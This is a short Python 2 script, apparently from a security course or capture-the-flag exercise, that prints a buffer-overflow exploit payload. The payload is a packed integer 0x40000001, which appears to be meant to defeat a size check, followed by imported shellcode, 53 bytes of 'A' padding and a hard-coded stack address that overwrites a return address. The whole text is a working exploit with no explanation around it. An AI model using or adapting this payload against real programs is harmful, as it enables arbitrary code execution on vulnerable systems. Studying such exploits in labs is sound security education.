from shellcode import shellcode
from struct import pack

print pack("<I", 0x40000001) + shellcode + 'A' * 53 + pack("<I", 0xbffe8b50)
